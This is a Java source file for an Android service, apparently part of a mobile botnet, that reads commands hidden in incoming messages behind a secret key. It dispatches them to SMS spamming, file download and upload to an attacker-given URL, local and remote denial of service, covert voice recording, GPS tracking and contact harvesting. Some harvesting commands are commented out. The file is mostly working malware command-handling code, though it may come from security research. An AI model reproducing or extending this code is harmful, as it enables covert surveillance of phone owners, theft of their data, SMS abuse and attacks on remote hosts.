package com.bot.bottest;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.widget.Toast;

public class Splice extends Service {
	// Commands we've implemented
	public static final int DEFAULT_CMD_LENGTH = 4;
	public static final String CMD_SPAM = "SPAM"; // SMS spamming
	public static final String CMD_DOWNLOAD = "DOLO"; // Download a file
	public static final String CMD_UPLOAD = "UPLO"; // Upload a file
	public static final String CMD_LDOS = "LDOS"; // Local denial of service
	public static final String CMD_RDOS = "RDOS"; // Remote denial of service
	public static final String CMD_RECORD_VOICE = "RVOI"; // Record voice
	public static final String CMD_RECORD_VIDEO = "RVID"; // Record voice
	public static final String CMD_HARVEST_GPS = "HGPS"; // Get GPS coordinates
	public static final String CMD_HARVEST_CONTACTS = "HCON"; // Get all contacts
	public static final String CMD_HARVEST_CALLLOGS = "HCAL"; // Get call logs
	public static final String CMD_HARVEST_TEXTS = "HTXT"; // Get all texts
	public static final String CMD_HARVEST_APPLIST = "HAPP"; // Get all the installed apps
	public static final String CMD_HARVEST_BOOKMARKS = "HBKM"; // Get bookmarks
	// TODO - redo UPLO, test RDOS, rewrite DOLO, repair HGPS scheduler
	
	@Override
	public void onStart(Intent intent, int startID) {
		String body = intent.getStringExtra("message");
		int keylen = intent.getIntExtra("keylen", 7);
		Context current_context = getApplicationContext();
		if (body.length() >= (keylen + 1 + DEFAULT_CMD_LENGTH)) { // length of secret key + 1 space + command_len
			String cmd = body.substring(keylen + 1, keylen + 1 + DEFAULT_CMD_LENGTH); // Get the command
			// Find which functionality to implement
			if (cmd.equalsIgnoreCase(CMD_SPAM)) { // Spam - Weidman's code
				String parsed_spam_text[] = body.split(" ");
				if (parsed_spam_text.length >= 4) {
					String number = "18001234567";
					if (parsed_spam_text[2] != null) number = parsed_spam_text[2]; // If there's a number, get it
					String message = "Hi";
					if (parsed_spam_text[3] != null) message = parsed_spam_text[3]; // If there's a message, get it
					for (int j = 4; j < parsed_spam_text.length; j++) {
						message += " " + parsed_spam_text[j];
					}
					Intent smsspam = new Intent(current_context, SMSSpam.class); // Prepare to spam
					smsspam.putExtra("number", number);
					smsspam.putExtra("message", message);
					current_context.startService(smsspam); // Spam time
				}
			}
			else if (cmd.equalsIgnoreCase(CMD_DOWNLOAD)) { // Download something
				String parsed_dl_text[] = body.split(" ");
				String urlToDownload = "http://127.0.0.1/index.html";
				if (parsed_dl_text[2] != null) urlToDownload = parsed_dl_text[2]; // If there's a url to download, get it
				String filenameToSaveAs = "wut.html";
				if (parsed_dl_text[3] != null) filenameToSaveAs = parsed_dl_text[3];  // If there's a filename to save as, get it
				Intent dlfile = new Intent(current_context, DownloadFile.class); // Prepare to DL
				dlfile.putExtra("url", urlToDownload);
				dlfile.putExtra("filename", filenameToSaveAs);
				current_context.startService(dlfile); // DL time
			} 
			else if (cmd.equalsIgnoreCase(CMD_UPLOAD)) { // Upload something
				String parsed_ul_text[] = body.split(" ");
				String filenameToUpload = "wut.txt";
				if (parsed_ul_text[2] != null) filenameToUpload = parsed_ul_text[2];  // If there's a filename to upload, get it
				String urltoUploadTo = "http://127.0.0.1";
				if (parsed_ul_text[2] != null) urltoUploadTo = parsed_ul_text[3]; // If there's a url to upload to, get it
				Intent ulfile = new Intent(current_context, UploadFile.class); // Prepare to upload
				ulfile.putExtra("filename", filenameToUpload);
				ulfile.putExtra("url", urltoUploadTo);
				current_context.startService(ulfile); // Upload time
			} 
			
			else if (cmd.equalsIgnoreCase(CMD_LDOS)) { // Local DoS
				Intent ldos = new Intent(current_context, LDOS.class); // Prepare to LDOS
				current_context.startService(ldos); // LDOS time
			} 
			else if (cmd.equalsIgnoreCase(CMD_RDOS)) { // Remote DoS
				String parsed_rdos_text[] = body.split(" ");
				String target_info_default[] = {"127.0.0.1:80"}; 
				String target_info[] = null;
				if (parsed_rdos_text[2] != null) target_info = parsed_rdos_text[2].split(":");  // If there's a target website:port, get it
				else target_info = target_info_default[0].split(":");
				String target = target_info[0];
				int port = Integer.parseInt(target_info[1]);
				//String type = parsed_rdos_text[3]; // Type of DoS wanted? - not implemented
				Intent rdos = new Intent(current_context, RDOS.class); // Prepare to RDOS
				rdos.putExtra("target", target);
				rdos.putExtra("port", port);
				//rdos.putExtra("type", type);
				current_context.startService(rdos);
			} 
			else if (cmd.equalsIgnoreCase(CMD_RECORD_VOICE)) { // Record voice
				String parsed_rv_text[] = body.split(" ");
				int timeToRecord = 30;
				if (parsed_rv_text[2] != null) timeToRecord = Integer.parseInt(parsed_rv_text[2]);
				String filename = "audio.3gp";
				if (parsed_rv_text[3] != null) filename = parsed_rv_text[3];
				Intent recordVoice = new Intent(current_context, RecordVoice.class);
				recordVoice.putExtra("timeToRecord", timeToRecord);
				recordVoice.putExtra("filename", filename);
				current_context.startService(recordVoice);
			} 
			/*else if (cmd.equalsIgnoreCase(CMD_RECORD_VIDEO)) { // Record a video clip
				// Not implemented
			} */
			else if (cmd.equalsIgnoreCase(CMD_HARVEST_GPS)) { // Harvest GPS coordinates
				String parsed_hgps_text[] = body.split(" ");
				int interval = 60;
				if (parsed_hgps_text[2] != null) interval = Integer.parseInt(parsed_hgps_text[2]); // In seconds
				String filename = "gps.txt";
				if (parsed_hgps_text[3] != null) filename = parsed_hgps_text[3];
				Intent harvestGPS = new Intent(current_context, HarvestGPS.class);
				harvestGPS.putExtra("interval", interval);
				harvestGPS.putExtra("filename", filename);
				current_context.startService(harvestGPS);
			} 
			else if (cmd.equalsIgnoreCase(CMD_HARVEST_CONTACTS)) { // Harvest contacts
				String parsed_hcon_text[] = body.split(" ");
				String filename = "contacts.txt";
				if (parsed_hcon_text[2] != null) filename = parsed_hcon_text[2];
				String whatKind = "NAME";
				if (parsed_hcon_text[3] != null) whatKind = parsed_hcon_text[3];
				Intent harvestContacts = new Intent(current_context, HarvestContacts.class);
				harvestContacts.putExtra("filename", filename);
				harvestContacts.putExtra("whatKind", whatKind);
				current_context.startService(harvestContacts);
			} 
			/*else if (cmd.equalsIgnoreCase(CMD_HARVEST_CALLLOGS)) { // Harvest call logs
				// Removed
			}*/
			/*else if (cmd.equalsIgnoreCase(CMD_HARVEST_TEXTS)) { // Harvest texts
				// Removed
			}*/
			/*else if (cmd.equalsIgnoreCase(CMD_HARVEST_APPLIST)) { // Harvest app list, even uninstalled ones
				// Removed
			}*/
			/*else if (cmd.equalsIgnoreCase(CMD_HARVEST_BOOKMARKS)) { // Harvest browser bookmarks
				// Removed
			}*/
			else {} // Cmd wrong or not implemented, so do nothing
		} // End bodylength / command parse if
	} // End onStart()
	
	@Override 
	public IBinder onBind(Intent intent) { // Android won't be quiet until this is here
		// TODO Auto-generated method stub
		return null;
	}
}
